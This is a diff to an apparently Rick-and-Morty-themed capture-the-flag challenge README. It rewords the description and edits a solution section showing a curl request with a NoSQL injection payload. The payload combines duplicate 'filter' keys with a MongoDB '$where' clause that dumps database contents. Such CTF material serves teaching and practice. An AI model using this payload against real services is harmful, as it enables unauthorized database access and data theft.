@@ -5,7 +5,7 @@
 
 ## Description
 
-In response to the Central Finite Curve, evil Morty is forming the Supersingular Finite Curve. This is a portion of the multiverse, where Mortys dominate over Ricks. Not sure if Morty's smart enough to complete this.. his maths may be out of order...
+Don't look at another man's portal gun history. We all go to weird places.
 
 ## Solution
 <details>
@@ -18,7 +18,9 @@ Part of this challenge is based on https://bishopfox.com/blog/json-interoperabil
 Using NoSQL injection participants can get the flag from the database using the following request:
 
 ```
-curl -X POST http://<HOST>:8082/portal -d '{"filter": {"name":"Citadel of Ricks"}, "find": "flag", "filter": {"$where": "throw JSON.stringify(this)"}}'
+curl -X POST http://<HOST>:8082/portal -d '{"filter": {"name":"Whatever..."}, "find": "flag", "filter": {"$where": "throw JSON.stringify(this)"}}'
 ```
+
+To clarify, mongo comes with an embedded javascript engine which allows for expressions in some operators. One of them is the `$where` operator.
 
 </details>
